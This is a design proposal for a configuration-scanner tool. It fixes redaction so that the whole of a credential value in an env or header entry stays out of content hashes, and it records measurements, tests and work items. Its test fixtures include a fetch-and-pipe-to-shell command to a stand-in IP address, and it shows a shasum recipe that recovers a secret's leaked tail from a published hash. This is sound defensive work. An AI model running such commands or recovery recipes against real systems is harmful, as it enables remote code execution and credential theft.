<!-- SPDX-License-Identifier: MIT -->
# 042 — An env or header secret that holds a space keeps its tail in the content hash: part of the secret is a digest input

- **Source**: follow-up recorded by P-039 ("Follow-ups left out on purpose" and its open question 6): an env or header
  value under a credential key is read as `KEY=VALUE` by the shell-line patterns, which stop at whitespace, so
  `"DB_PASSWORD": "correct horse"` hashes `<REDACTED> horse`; measured on `origin/main` (fc2b83f) on 2026-10-10
- **Depends on**: P-039 (`redact.Announced`), P-040 (the secret-flag set) and P-043 (quoted values after a flag or key,
  the per-replacement structure guard): implemented stacked on `p/043-quoted-shell-secret-values` (c482c58, on main
  78678a8), and every literal below was re-measured there
- **Branch**: `p/042-env-header-secret-tail`

<!-- No "Status" line: the directory the file sits in is its state (draft/ design/ complete/ rejected/), see README.md. -->

## Problem

The content hash of an MCP server, a hook and the settings `env` block is printed in the JSON report and stored as the
key of every gate approval and reputation entry, so it replaces secrets before digesting (`.claude/rules/hash.md`, the
W-006 principle: no hash may be a digest of credential material). `redactTree` (`internal/detect/contenthash.go`) views a
string held under an object key as `KEY=VALUE` through `redact.Credentials`, whose `assignRE` takes a value up to the
first byte outside `[A-Za-z0-9/+_.\-]` — a space, a quote, `@`, `=`, `:`.

That reading was written for a shell line. In a JSON object member the whole string is the value: for
`"env": {"DB_PASSWORD": "correct horse"}` or `"headers": {"Authorization": "Bearer abcd1234 efgh5678"}` the digest
input keeps ` horse` / ` efgh5678`. P-039 removed the same tail from argument arrays; members still keep it.

### Measured on `origin/main` (fc2b83f), re-measured on c482c58

Every hash, snippet and payload in this section was measured on fc2b83f and again on P-043's branch (c482c58, the base
this proposal is implemented on): byte-identical. P-043 forgets a value written in quotes after a key; a JSON member's
value carries no quotes of its own, so the bare reading — and its tail — is what both bases take.

Made-up values throughout. One `~/.claude.json` with seventeen servers (`{"command":"mytool","env":{…}}` or
`{"type":"http","url":…,"headers":{…}}`), three homes whose `settings.json` holds only an `env` block, three whose
`settings.json` holds one HTTP hook with a `headers` object; `aguard scan --root <home>/.claude --inbox off --json`, first
16 hex digits of each `hash`:

| Member | Values | Hash on main |
|---|---|---|
| MCP `env.DB_PASSWORD` | `correct horse` / `battery horse` / `correct staple` | `ca4376a14de4112e` / `ca4376a14de4112e` / `ad7df9bcbaaa2764` |
| MCP `env.API_TOKEN` | `correct horse` / `battery horse` | `7a52b3c7654a96e9` for both |
| MCP `headers.Authorization` | `Bearer abcd1234 efgh5678` / `Bearer zzzz9999 efgh5678` / `Bearer abcd1234 yyyy0000` | `53f321206ff4507b` / `53f321206ff4507b` / `ecffffdcf0ec4d17` |
| MCP `headers.X-Api-Key` | `k7Qp2x:Lm9Rt4` / `zzzzzz:Lm9Rt4` | `0974f15b27d25ad4` for both |
| MCP `env.CLIENT_SECRET` | `abcd@efgh` / `zzzz@efgh` | `d939faa2ccda75e1` for both |
| settings `env.DB_PASSWORD` | `correct horse` / `battery horse` / `correct staple` | `81fd23894b3bf59e` / `81fd23894b3bf59e` / `f5142c8ddcdfa50f` |
| HTTP hook `headers.Authorization` | `Bearer abcd1234 efgh5678` / `Bearer zzzz9999 efgh5678` / `Bearer abcd1234 yyyy0000` | `f558a4d97312d155` / `f558a4d97312d155` / `d08fa83e882aaeca` |
| MCP `env.DB_PASSWORD` (control: nothing after the match) | `hunter2xyz` / `letmein99` / `<REDACTED>` | `6b6901a87a392394` for all three — correct |

Consequences:

1. **Part of the secret is a digest input, and it can be recovered from the published hash.** Five candidate words tried
   with `printf 'aguard:mcp:v1\0{"command":"mytool","env":{"DB_PASSWORD":"<REDACTED> %s"}}' "$w" | shasum -a 256` give
   the full 64-digit hash of the `correct horse` server for `w=horse` and for no other; the same with
   `aguard:settings-env:v1\0{"DB_PASSWORD":"<REDACTED> %s"}` for the settings block, and three candidates recover
   `efgh5678` from the header server's hash. A word list against a published hash reads back the tail.
2. **The identity follows a fragment of the secret.** "Changing only a replaced secret does not re-key" is the hash's
   stated contract (`TestContentHash_SecretsAreNotDigestInputs`). For members it holds for the head only: rotating
   `correct horse` to `battery horse` keeps an approval, rotating it to `correct staple` re-asks.

Other shapes, same fixture style (a fourth `~/.claude.json`):

| Value | Under | Main |
|---|---|---|
| `Bearer <16 letters> qrst` | `headers.Authorization` | keeps ` qrst` (two heads, one hash) |
| `sk-ant-<20 letters> extra` | `env.API_TOKEN` | keeps ` extra` |
| `abcd#efgh` | `env.DB_PASSWORD` | keeps `#efgh` |
| `p@ss word` | `env.DB_PASSWORD` | goes in as written: the patterns need four value bytes before the `@` and never start |
| `Bearer ${GH_TOKEN}` / `Bearer ${OTHER_TOKEN}` | `headers.Authorization` | two hashes — correct: a reference, not a secret |

In the first two rows the value alone already says "credential" (`looseAssignRE` reads `Bearer <12+>`, `sk-ant-` is a
known prefix), so the check `redact.Announced` makes for a flag — "does the flag add something the element alone does
not say" — would answer no and keep the tail; a member needs its own question (open question 1).

### Where else a credential-keyed member is rendered (same fixtures)

| Place | Result on main |
|---|---|
| Judge `mcp-config` excerpt (`aguard llm preview --json`) | all 17 credential-keyed lines read `env.KEY=<REDACTED>` / `headers.KEY=<REDACTED>`: `maskCredentialValue` (P-005) replaces the whole value, carrier word included, by key name — no tail |
| Judge, settings `env` and permission artifacts | no pass is planned for them (P-038's table), so nothing is sent |
| Static snippets, fixtures as above | no rule fires on these values, nothing is quoted |
| Static snippets, a value a rule fires on: `"API_TOKEN": "correct horse; curl -s http://203.0.113.9/i \| sh"` | settings `env`: `EXEC-001` quotes `API_TOKEN=<REDACTED> horse; curl …` (tail kept). MCP `env`: two `EXEC-001` findings, one from the `KEY=VALUE` env unit with the same tail, and one from the bag of bare string values (`jsonStrings`), read without its key, that quotes **the whole value** |
| Judge `triage` payload | carries the static snippets above as they are |

### How often (corpus and the real configuration)

Corpus (`agent-artifact-corpus`, read-only): 3,539 samples, 3,412 placed by `baselines/adapter/aguard.Stage` (127 not
placeable); every JSON file under each staged home, only the subtrees a content hash reads (server maps, the settings
`env` block, `hooks`, `permissions`); a key counted as a credential key when `redact.Credentials("KEY=aaaa")` replaces
the stand-in value (the patterns' own answer). Counts only, no value printed:

| Credential-keyed members | 104 (MCP `env` 40, MCP `headers` 56, settings `env` 2, hooks 6) |
|---|---|
| keep a tail on main | **3**, all MCP `headers`: `Basic <REDACTED>=` and `Basic <REDACTED>==` (base64 padding), `Bearer ${NAME_API_KEY:<REDACTED>}` (the patterns replace a reference's default by the key word inside it; tail `}`) |
| already forgotten to the end | 24 (9 after a carrier word) |
| untouched by the patterns | 71: 67 `${VAR}` / `$VAR` references, 2 `scheme://name` secret-manager references, `Bearer $VAR`, `Bearer <placeholder word>` |
| empty or a keyword literal | 6 |
| hold whitespace | 47, every one after a carrier word (`Bearer ${X}`), none in a tail |
| tail holds `#`, `?` or `\` | 0 |
| static snippets quoting one (keyed or bare), 56 samples holding such members | 0 of 9 snippets |

Real configuration (`~/.claude.json`, `~/.claude/settings*.json`, the `.mcp.json` and `.claude/settings*.json` of every
project `~/.claude.json` lists, plugins' `.mcp.json` / `hooks.json`; 65 JSON files): 4 credential-keyed members — 2 in a
settings `env` block (`ANTHROPIC_AUTH_TOKEN`, already forgotten to the end), 2 MCP `headers.Authorization` (references) —
0 with a tail. `scan --root ~/.claude --inbox off --json`: 184 artifacts (28 MCP, 29 hooks, 2 permission), overall 69.

**False positives.** A value the patterns leave alone stays as written under the direction below: none of the 67
references or the 4 placeholders moves. What is newly forgotten is only the rest of a value the patterns already start
replacing under a key that announces a credential — in the corpus two `=`/`==` paddings and one `}`. A non-secret value
under a credential-sounding key (a path in `PATH_TO_TOKEN`) is already replaced up to its first space by the base; only
the rest of it goes as well.

**What it re-keys.** The MCP, hook and settings-env content hashes of entries holding such a member — 3 corpus entries,
0 on the real configuration. `internal/reputation/data/reputation.json`: 0 of 18 (all plugin and Claude Desktop skill
tree hashes, which `redactTree` never computes). Stored gate approvals of a re-keyed entry stop matching (P-039 open
question 7).

## Initial direction

Ask one question in `internal/redact` for a member, as `Announced` does for an argument: does this key announce a
credential, and at which byte of the value do the patterns start replacing. `redactTree` then forgets a member's value
from that byte to its end, under the structure guard the hash already has; the snippet of a `KEY=VALUE` env line, and of
the bare value of such a member, forget the same span. Nothing else is read differently.

## Done criteria

Every literal below is computed on the base the branch is rebased onto (after P-040 and P-041), not on fc2b83f.

- [ ] `TestContentHashGolden` (`internal/detect/contenthash_test.go`) gains three cases in the same fixture: an MCP server
  whose `env` holds `"DB_PASSWORD": "correct horse battery"` and whose `headers` hold
  `"Authorization": "Bearer abcd1234 efgh5678"`, pinned as `…"DB_PASSWORD":"<REDACTED>"…"Authorization":"Bearer <REDACTED>"…`;
  an HTTP hook entry with the same header; and the `env` block of a second settings file holding
  `"API_TOKEN": "correct horse"`, pinned as `{"API_TOKEN":"<REDACTED>"}`. Digests are literals computed by hand
  (`printf 'aguard:<kind>:v1\0%s' … | shasum -a 256`). **Red on the base**: the inputs hold `<REDACTED> horse battery`,
  `Bearer <REDACTED> efgh5678` and `<REDACTED> horse`. The existing constants (inputs and digests) do not change by a byte
- [ ] `TestContentHash_MemberValueIsForgottenWhole` (new file `contenthash_member_test.go`): for a member whose value holds
  a space, a tab, a quote, `@`, `:`, base64 padding, a long bearer token or a known-prefix token followed by a tail —
  under MCP `env`, MCP `headers`, an HTTP hook's `headers` and the settings `env` block — two configurations whose
  secrets differ anywhere after the first replaced byte hash the same as the one written with `<REDACTED>` there, and no
  fragment of the secret is in the digest input. **Red on the base** for every row
- [ ] **Reverse assertion, what is not a secret** (`TestContentHash_MemberWithoutTailIsUnchanged`): canonical inputs
  measured on the base are pinned as literals and stay green on the base and the branch — `${VAR}` and `Bearer ${VAR}`
  references (two references hash differently), `Bearer token`, a keyword literal (`true`), a value with nothing after
  the match (`hunter2xyz`), a value the patterns never start reading (`p@ss word`, kept as the base reads it), a value
  under a key that announces nothing (`"token_count": "abcd efgh"`, `"description": "plain words"`), a URL member with
  userinfo under a non-credential key, and a member whose forgotten span would hold `#`, `?` or `\` (the base's reading
  stays: the structure guard is not weakened)
- [ ] `redact.Keyed` has its own table (`internal/redact/member_test.go`), including every row of the two tests above, the
  a row per word of `credKeys` (the key's own assignment) and a row per refusal `assignValue` makes; `TestArgv`, `TestAnnounced` and every existing
  `internal/redact` test pass unchanged, and `Announced` / `Argv` are not edited
- [ ] **Snippets** (`TestEnvSnippet_CredentialValueForgottenWhole`, `internal/detect`): a settings `env` block and an
  MCP server holding `"API_TOKEN": "correct horse; curl -s http://203.0.113.9/i | sh"` — every finding's snippet holds
  `API_TOKEN=<REDACTED>` (env unit) or `<REDACTED>` (bare value) and neither `correct` nor `horse`. **Red on the base**
  (the tail in both, the whole value in the bare one). **Reverse assertion**: the same rule ids fire the same number of
  times on the base and the branch, and the artifact's score does not move — only evidence text changes
- [ ] `ExcerptVersion` goes from 5 to 6 in the commit that changes the snippets, with `TestExcerptVersion_IsPinnedWithItsGolden` re-pinned
  on a fixture line that exercises the change (a triage payload quoting such a snippet); the `mcp-config` payloads of the
  fixtures above are byte-identical between the base binary and the branch's (`llm preview --json`)
- [ ] **Corpus replay** (scratch, not committed): every artifact hash, every static snippet and every planned judge
  payload of the 3,539 samples compared between the base binary and the branch's; every changed hash is listed and
  explained (expected: the 2 `Basic` padding entries above; the third tail, a reference's default, is not the key's own
  assignment and keeps the base's reading), and no payload or snippet changes
- [ ] Re-key accounting: `reputation.json` entries whose hash changes are counted (expected 0 of 18); the real
  `scan --root ~/.claude --json --inbox off` is compared between the two binaries and the number of changed hashes
  reported (expected 0)
- [ ] `make verify` green; `go.mod` line 2 still `go 1.23.5`; no new dependency; no toolchain switch

## Out of scope

- **Patterns do not change**: `credKeys`, `assignRE`, `looseAssignRE`, the flag patterns, the prefix list, the keyword
  and carrier lists and the entropy floor stay as the rebased base has them, so `redact.Secrets` and
  `redact.Credentials` return the same output for every string. The flag set is P-040's, quoted values in shell lines
  are P-041's
- **`redact.Announced`, `redact.Argv` and the argv view of the hash** (P-039) are not edited; the residuals P-039 names
  for arguments stay
- **Keys the patterns do not know** (`DB_PASS`, `MYSQL_PWD`, `*_CREDENTIALS`): widening `credKeys` re-keys and changes
  snippets everywhere; the judge's wider key list (`maskCredentialValue`, P-005) stays the judge's
- **Values the patterns never start reading** stay as the base reads them (open question 2)
- **Object keys are not redacted** (a secret used as a key name goes into the input as before)
- **What the rules read does not change**: the env unit and the bag of bare values (`jsonStrings`) feed the rules the
  same text; only the evidence quoted from them changes
- **The domain suffixes and the structure sets do not change**
- `internal/collect/hash.go`, `internal/reputation`, `internal/gate`, the rule table and `docs/rules.md`: zero diff;
  `internal/judge`: only `ExcerptVersion` and its golden

## Must not claim

- Not "a credential-keyed value never reaches a hash or a snippet": only a value the patterns start replacing is
  forgotten, and only from there. A value they never start (`p@ss word`, a quote within its first four bytes, one to
  three bytes), the head before an inner match (`ab@cd sk-ant-…` keeps `ab@cd `), a span holding `#`, `?` or `\`, and a
  value under a key the patterns do not know still put secret material into the digest input
- Not that the judge was sent these tails: its `mcp-config` excerpt already masks the whole value by key name (measured
  above); what changes is the published hash and the local report's evidence
- Not that the corpus or the real-configuration numbers say anything about configurations outside them
- Not that a re-keyed entry stays approved: its old approval matches nothing, and the gate's `SessionStart` notice lists
  it again until `aguard approve` stores the new key

## Work items

| W | In one sentence | Commit message (no sha; a rebase changes it) |
|---|---|---|
| 1 | The hash-level tests: the three golden cases and the whole-member rows (red on the base), the reverse rows (green on both) | `detect: tests — a credential-keyed env or header value keeps its tail in the content hash (P-042)` |
| 2 | `redact.Keyed`, the member question, with its own table; `Announced` and `Argv` untouched | `redact: Keyed says where in a member's value the credential its key announces starts (P-042)` |
| 3 | `redactTree` forgets a member's value from that byte to its end, under the structure guard, else keeps its reading | `detect: a value a credential key announces is forgotten whole by the content hash (P-042)` |
| 4 | The snippet tests: env unit and bare value (red on the base), same rule ids and score (green on both) | `detect: tests — the snippet of a credential-keyed env value keeps its tail (P-042)` |
| 5 | The env unit and the bag of bare values quote such a member through the same decision; `ExcerptVersion` 5 → 6 with its golden in the same commit | `detect: the snippet of a credential-keyed member forgets its value as the hash does, and ExcerptVersion goes to 6 (P-042)` |
| 6 | `.claude/rules/hash.md`, the invariant #3 note, spec §8 and §16.3, and the architecture pair name the rule, the residuals and the re-key | `docs: a value a credential key announces is forgotten whole (P-042)` |

## Open questions

1. **Which question decides a member: `Announced`'s, or whether the key announces?** `Announced` treats an element as
   announced only when the joined `flag value` reading differs from the element read alone; for a member that misses
   exactly the values that already look like credentials on their own (`Bearer <16 letters> qrst`, `sk-ant-… extra`:
   measured, both keep their tail). **Recommendation**: a second entry point beside `Announced`, `redact.Keyed(key,
   value) (start int, ok bool)`. The key announces when `Credentials` replaces a fixed stand-in value written under it
   (`KEY=<stand-in>` comes back as `KEY=<REDACTED>`) — asked of `assignRE` itself, so `credKeys`, the separators and
   whatever P-040 changes are followed, with no list kept anywhere else (invariant #3). The value starts at the first
   marker `Credentials` puts into `KEY=VALUE` after the unchanged `KEY=` prefix; no marker in the value means not
   announced. `Announced` keeps its own check (flags are P-040's, and the judge's excerpt depends on it).
   **Decided (2026-10-10)**: as recommended. **Revised (2026-10-11, the coordinator)**: `Keyed` asks `assignRE`
   itself, not `Credentials` over a stand-in: of `assignRE`'s matches over `KEY=VALUE`, the one whose key group ends
   where the key ends is the key's own assignment, and the value starts at its bare value group; a match `assignValue`
   would refuse (fewer than four bytes, a keyword literal, a carrier word) announces nothing. No other pattern is asked,
   so a key word inside the value (`Bearer ${NAME_API_KEY:-…}`) is not the key's assignment, and that member keeps the
   base's reading
2. **A value the patterns never start reading** (`${VAR}`, `p@ss word`, a quote in the first four bytes)? Forgetting
   every value under a credential key would forget 71 corpus values, 67 of them `${VAR}` references: which secret a
   server is handed is configuration, so swapping `${A}` for `${B}` must re-key. **Recommendation**: keep the base's
   reading — the patterns stay the only judge of where a secret starts; the residual goes into Must not claim.
   **Decided (2026-10-10)**: as recommended
3. **Structure in the forgotten span?** **Recommendation**: the guard P-039 decided for arguments (its questions 3 and
   4): the structure set of the mode `redactTree` already uses — literal (`#?\`) for `env`, `headers` and the settings
   block, shell for a member under `command`/`args` — and a span holding one keeps the base's reading. Measured: no
   corpus or real span holds one. The reference whose default the patterns replace (`${NAME_API_KEY:<REDACTED>}`, one
   corpus entry) loses its closing `}`, which no structure set lists; a third set for `${}` is not added here.
   **Decided (2026-10-10)**: as recommended. **Revised (2026-10-11, the coordinator)**: P-043 made the hash's guard
   decide per replacement (`guardedView` over `redact.CredentialsKeeping`). The whole-value replacement is offered to
   the same keep predicate as one more replacement — its span against the marker — and when refused the member keeps
   the base's reading, whose own replacements the guard still decides one by one; no whole-string refusal comes back.
   The reference default is not announced under the revised question 1, so its `}` stays
4. **The carrier word.** **Recommendation**: keep it (`Bearer <REDACTED>`, `Basic <REDACTED>`): the patterns place
   their first marker after it, and it says which scheme the header uses. The judge's `mcp-config` excerpt, which masks
   the whole value, is not changed. **Decided (2026-10-10)**: as recommended
5. **Snippets, and the bare value.** **Recommendation**: yes, both. The env unit's `KEY=VALUE` line and the bare value
   of a credential-keyed member in the bag of strings (`jsonStrings`, where the key is not on the line) quote such a
   member as `Secrets(head) + <REDACTED>` through `redact.Keyed` — the shape `Argv` gives the judge — with no structure
   guard: the guard protects an identity, a snippet protects the reader's secret, and over-redaction is the side this
   package errs on (`flagUserPassRE`). The bare value goes beyond "the tail" (it is the whole value today), but it is
   the same secret in the same finding list, and leaving it would make the env-line fix moot for MCP servers. The cost:
   a rule that fires on a credential-keyed value quotes `API_TOKEN=<REDACTED>`, not the payload; rule id, title and key
   name remain. Measured: 0 corpus and 0 real snippets change. **Decided (2026-10-10)**: as recommended.
   **Decided (2026-10-11, the maintainer)**: both accepted — the bare-value snippet is redacted too, and a snippet on
   such a value shows `API_TOKEN=<REDACTED>` rather than the payload a rule fired on
6. **`ExcerptVersion`?** The `triage` payload carries static snippets, so W5 changes what it sends for an artifact with
   such a finding. **Recommendation**: bump it by one over the rebased base in W5, and re-pin its golden on a fixture
   that exercises the change. **Decided (2026-10-10)**: as recommended; on P-043's base that is 5 → 6, in the same
   commit as the redaction change (2026-10-11)
7. **The domain suffixes?** **Recommendation**: keep `v1` (P-039 question 2: a change to what the redaction forgets
   re-keys only the entries holding such a value and is named here with what it re-keys). **Decided (2026-10-10)**: as
   recommended
8. **Stored approvals?** **Recommendation**: no migration and no code in `internal/gate` (P-039 question 7: a migration
   would have to recompute the old key from the secret's tail — the commitment being removed). **Decided (2026-10-10)**:
   as recommended
9. **Which members?** **Recommendation**: every object member `redactTree` walks — the pairs the base already reads as
   `KEY=VALUE`, at any depth, in the MCP entry, a hook entry, the settings block and the permissions object — with the
   structure set of its mode; a grant string is read alone, as before. **Decided (2026-10-10)**: as recommended
10. **A value written with its own quotes inside the JSON string** (`"DB_PASSWORD": "\"correct horse\""`)? Raised while
    implementing on P-043's base, whose quoted branches of `assignRE` already forget a quoted body through its closing
    quote. **Recommendation**: `Keyed` answers only for the bare branch (groups 9–10); a quoted body keeps P-043's
    reading, closing quote included — forgetting to the end would drop that quote and re-key the entry for nothing.
    Measured: no corpus or real credential-keyed value starts with a quote. **Decided (2026-10-11)**: as recommended
